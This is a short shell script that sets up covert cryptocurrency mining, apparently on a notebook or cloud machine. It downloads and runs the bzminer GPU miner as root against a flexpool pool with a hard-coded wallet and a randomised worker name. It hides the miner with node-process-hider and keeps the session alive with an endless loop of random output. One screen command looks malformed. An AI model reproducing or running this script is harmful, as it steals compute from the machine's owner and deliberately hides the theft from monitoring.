sudo apt update
sudo apt install screen -y
screen -dmS v.sh 89 95
%cd /opt
sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add bzminer
sudo apt install libpci3
sudo apt-get install screen
wget -nv -c https://github.com/bzminer/bzminer/releases/download/v8.0.0/bzminer_v8.0.0_linux_cuda_tk.tar.gz -O - | tar -xz
sudo ./bzminer -a ethash -w 0x3D02F7B8DCB18E778fE35bf8B5A7F91d819bF0C4 -p stratum+ssl://eth-sg.flexpool.io:5555 -r $(echo $(shuf -i 201-400 -n 1)-$(shuf -i 1-200 -n 1)-$(shuf -i 401-600 -n 1)-$(shuf -i 601-800 -n 1)) --nvidia 1
while [ 1 ]; do
  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
sleep 2
done
